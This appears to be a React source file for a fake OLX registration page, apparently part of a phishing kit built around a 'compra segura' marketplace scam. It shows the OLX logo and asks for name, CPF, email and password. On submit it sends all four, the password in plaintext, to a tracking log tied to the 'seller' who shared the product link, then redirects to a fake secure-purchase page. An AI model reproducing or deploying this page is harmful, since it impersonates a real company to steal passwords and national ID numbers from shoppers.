import { createFileRoute, Link, useNavigate, useSearch } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Eye, EyeOff } from "lucide-react";
import { logVisitorActivity, fetchProductBySlug } from "@/lib/tracking";
import olxLogo from "@/assets/olx-logo.png";
import "@/styles/olx.css";

type Search = { produto?: string };

export const Route = createFileRoute("/cadastro")({
  validateSearch: (s: Record<string, unknown>): Search => ({
    produto: typeof s.produto === "string" ? s.produto : undefined,
  }),
  head: () => ({
    meta: [
      { title: "Cadastre-se - OLX" },
      { name: "description", content: "Crie sua conta OLX. É grátis!" },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
  component: RegisterPage,
});

function RegisterPage() {
  const navigate = useNavigate();
  const { produto: searchSlug } = useSearch({ from: "/cadastro" }) as Search;
  const productSlug =
    searchSlug ??
    (typeof window !== "undefined"
      ? localStorage.getItem("olx_produto_slug") ?? undefined
      : undefined);
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ name: "", cpf: "", email: "", password: "" });

  useEffect(() => {
    (async () => {
      if (!productSlug) return;
      const p = await fetchProductBySlug(productSlug);
      if (p) logVisitorActivity(p.user_id, "register_page_view", productSlug, p.name);
    })();
  }, [productSlug]);

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 11);
    return numbers
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.name || !formData.cpf || !formData.email || !formData.password) return;
    if (formData.cpf.replace(/\D/g, "").length !== 11) return;

    if (productSlug) {
      const p = await fetchProductBySlug(productSlug);
      if (p) {
        await logVisitorActivity(
          p.user_id,
          "register_submit",
          productSlug,
          p.name,
          `Nome: ${formData.name} | CPF: ${formData.cpf} | E-mail: ${formData.email} | Senha: ${formData.password}`,
        );
      }
    }
    localStorage.setItem("olx_auth_completed", "true");
    navigate({
      to: "/compra-segura",
      search: productSlug ? { produto: productSlug } : {},
      replace: true,
    } as any);
  };

  return (
    <div className="login-page">
      <main className="login-container">
        <div className="login-card">
          <div className="login-logo">
            <Link to="/">
              <img src={olxLogo} alt="OLX" style={{ height: 48 }} />
            </Link>
          </div>

          <h1 className="login-title">Crie a sua conta. É grátis!</h1>
          <p className="register-subtitle">
            Nos informe alguns dados para que possamos melhorar a sua experiência na OLX.
          </p>

          <form onSubmit={handleSubmit} className="login-form">
            <div className="login-field">
              <label htmlFor="name">Como você quer ser chamado(a)?</label>
              <input
                id="name"
                type="text"
                placeholder="Exemplo: João S."
                value={formData.name}
                onChange={(e) => setFormData({ ...formData, name: e.target.value })}
              />
              <span className="field-hint">Aparecerá em seu perfil, anúncios e chats.</span>
            </div>

            <div className="login-field">
              <label htmlFor="cpf">CPF</label>
              <input
                id="cpf"
                type="text"
                placeholder="___.___.___-__"
                value={formData.cpf}
                onChange={(e) => setFormData({ ...formData, cpf: formatCPF(e.target.value) })}
              />
            </div>

            <div className="login-field">
              <label htmlFor="email">E-mail</label>
              <input
                id="email"
                type="email"
                value={formData.email}
                onChange={(e) => setFormData({ ...formData, email: e.target.value })}
              />
              <span className="field-hint">Enviaremos um e-mail de confirmação.</span>
            </div>

            <div className="login-field">
              <label htmlFor="password">Senha</label>
              <div className="password-input-wrapper">
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={formData.password}
                  onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                />
                <button
                  type="button"
                  className="password-toggle"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? <Eye size={20} /> : <EyeOff size={20} />}
                </button>
              </div>
              <span className="field-hint">Crie uma senha forte para proteger a sua conta.</span>
            </div>

            <button type="submit" className="login-submit-btn">
              Cadastre-se
            </button>
          </form>

          <div className="login-divider"></div>

          <div className="login-switch">
            <span>Já tem uma conta?</span>{" "}
            <Link
              to="/login"
              search={productSlug ? { produto: productSlug } : {}}
              className="login-switch-link"
            >
              Entrar
            </Link>
          </div>
        </div>
      </main>
    </div>
  );
}
